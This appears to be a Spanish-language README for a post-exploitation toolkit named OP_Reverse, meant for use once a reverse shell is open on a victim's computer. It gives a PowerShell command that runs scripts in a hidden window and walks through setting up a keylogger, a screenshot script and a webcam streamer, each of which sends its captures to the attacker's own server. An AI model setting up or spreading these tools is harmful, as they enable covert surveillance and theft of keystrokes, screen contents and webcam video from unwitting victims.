# OP_Reverse
Herramientas útiles para una vez tienes establecida una reverse shell

Para ejecutar un script en una ventana oculta, usa el siguiente comando:
powershell.exe -WindowStyle Hidden -Command "& {python 'C:\ruta\archivo.py'}"

Los scripts disponibles son:
* Capturas: Un script de powershell que saca una captura y la manda al servidor especificado
* Webcam: Un script hecho en python que coge el video de la webcam del equipo y lo empieza a streamear en su ip y puerto indicado

Ejemplo de setup:
1. Establecer en server_recibir_main.py el puerto que queramos usar
1. Establecer el puerto objetivo en webcam.py
2. Establecer la ip del equipo víctima y el puerto elegido anteriormente en detener_webcam.py
3. Establecer en kgr.py el tiempo de grabación de las teclas, el nombre/la ruta parar el archivo y el URL del servidor de nuestra máquina atacante
4. Establecer en captura.ps1 el URL del servidor de nuestra máquina atacante y el nombre que queremos para el archivo